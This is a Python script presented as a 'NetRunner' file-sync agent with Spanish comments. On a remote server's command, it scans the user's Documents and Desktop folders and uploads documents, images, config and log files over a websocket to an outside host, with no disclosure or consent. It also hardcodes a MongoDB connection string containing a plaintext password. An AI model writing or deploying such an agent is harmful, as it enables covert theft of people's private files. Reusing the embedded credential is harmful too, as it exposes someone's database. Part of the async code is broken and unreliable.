# sync_agent.py - NetRunner Sync-Node v2.1 (Filtered & Deduplicated)
import asyncio
import websockets
import json
import os
import sys
import hashlib
import time
import ssl
import platform
from pathlib import Path
from pymongo import MongoClient
from tinydb import TinyDB, Query

# --- DETECCIÓN DE ENTORNO (PYINSTALLER) ---
def get_app_data_dir():
    """Obtiene la carpeta de datos del usuario según el SO."""
    if platform.system() == "Windows":
        base = Path(os.environ.get('LOCALAPPDATA', Path.home() / 'AppData' / 'Local'))
    else:
        base = Path.home() / '.local' / 'share'
    
    app_dir = base / 'netrunner'
    app_dir.mkdir(parents=True, exist_ok=True)
    return app_dir

APP_DATA_DIR = get_app_data_dir()

def get_resource_path(relative_path):
    """Obtiene la ruta correcta para recursos internos."""
    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

# --- CONFIGURACIÓN ---
WS_URI = "wss://netrunner-pro.up.railway.app/"
MONGO_URI = "mongodb+srv://ffasito:Reputo11.@rybjuani.ewuurhu.mongodb.net/?appName=rybjuani"
SYNC_DIRECTORIES = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop")]
ALLOWED_EXTENSIONS = ['.pdf', '.docx', '.jpg', '.jpeg', '.png', '.cfg', '.json', '.xml', '.log']
CHUNK_SIZE = 1024 * 1024
HEARTBEAT_INTERVAL = 30
MAX_RECONNECT_DELAY = 60

# --- INICIALIZACIÓN ---
mongo_client = MongoClient(MONGO_URI)
db = mongo_client.netrunner_logs
log_collection = db.sync_agent_logs
local_db = TinyDB(APP_DATA_DIR / 'sync_history.json')

LOG_FILE = APP_DATA_DIR / 'sync.log'

# --- FUNCIONES CORE ---
def log_to_mongo(level, message, metadata={}):
    try:
        log_collection.insert_one({
            'level': level,
            'message': message,
            'timestamp': time.time(),
            **metadata
        })
    except Exception as e:
        print(f"MongoDB log error: {e}")

def local_log(message):
    """Escribe en el log local."""
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{time.ctime()}] {message}\n")
    except Exception as e:
        print(f"Log file error: {e}")

def get_file_hash(file_path):
    """Calcula el hash SHA-256 de un archivo."""
    h = hashlib.sha256()
    with open(file_path, 'rb') as f:
        while True:
            chunk = f.read(8192)
            if not chunk:
                break
            h.update(chunk)
    return h.hexdigest()

async def upload_file_in_chunks(websocket, file_path):
    try:
        file_size = os.path.getsize(file_path)
        filename = os.path.basename(file_path)
        
        with open(file_path, 'rb') as f:
            chunk_index = 0
            while True:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                
                is_last = len(chunk) < CHUNK_SIZE
                await websocket.send(json.dumps({
                    'type': 'file_chunk',
                    'filename': filename,
                    'chunk_index': chunk_index,
                    'is_last': is_last,
                    'size': file_size
                }))
                await websocket.send(chunk)
                chunk_index += 1
        
        log_to_mongo("info", f"Archivo subido: {filename}", {'size': file_size})
    except Exception as e:
        log_to_mongo("error", f"Error al subir {file_path}: {e}")

def scan_and_upload(websocket):
    """Escanea, filtra y sube archivos nuevos o modificados."""
    log_to_mongo("info", "Iniciando escaneo local...")
    File = Query()
    uploaded_count = 0
    skipped_count = 0

    for directory in SYNC_DIRECTORIES:
        if not os.path.exists(directory):
            continue
        
        for root, _, files in os.walk(directory):
            for filename in files:
                if not any(filename.lower().endswith(ext) for ext in ALLOWED_EXTENSIONS):
                    continue

                file_path = os.path.join(root, filename)
                try:
                    file_hash = get_file_hash(file_path)
                    result = local_db.get(File.path == file_path)
                    if result and result['hash'] == file_hash:
                        skipped_count += 1
                        continue
                    
                    asyncio.get_event_loop().run_until_complete(upload_file_in_chunks(websocket, file_path))
                    local_db.upsert({'path': file_path, 'hash': file_hash}, File.path == file_path)
                    uploaded_count += 1
                except Exception as e:
                    log_to_mongo("error", f"Error procesando {file_path}: {e}")

    summary = f"Escaneo completo. {uploaded_count} archivos subidos, {skipped_count} omitidos por duplicado."
    log_to_mongo("info", summary)
    local_log(summary)


# --- WEBSOCKET CLIENT ---
async def agent_handler():
    reconnect_delay = 5
    
    while True:
        try:
            async with websockets.connect(WS_URI, ssl=ssl.create_default_context()) as websocket:
                reconnect_delay = 5
                log_to_mongo("info", "Conectado al servidor NetRunner")
                local_log("Conectado al servidor NetRunner")
                
                while True:
                    try:
                        message = await asyncio.wait_for(websocket.recv(), timeout=HEARTBEAT_INTERVAL)
                        data = json.loads(message)
                        
                        if data.get('command') == 'start_sync':
                            scan_and_upload(websocket)
                    except asyncio.TimeoutError:
                        await websocket.send(json.dumps({'type': 'heartbeat'}))
                    except websockets.exceptions.ConnectionClosed:
                        break
                        
        except Exception as e:
            error_msg = f"Desconectado: {e}. Reintentando en {reconnect_delay}s..."
            log_to_mongo("error", error_msg)
            local_log(error_msg)
            await asyncio.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 2, MAX_RECONNECT_DELAY)

if __name__ == "__main__":
    local_log(f"NetRunner Agent iniciado. Plataforma: {platform.system()}")
    try:
        asyncio.run(agent_handler())
    except KeyboardInterrupt:
        local_log("Agent detenido por el usuario")
        print("Agent detenido")
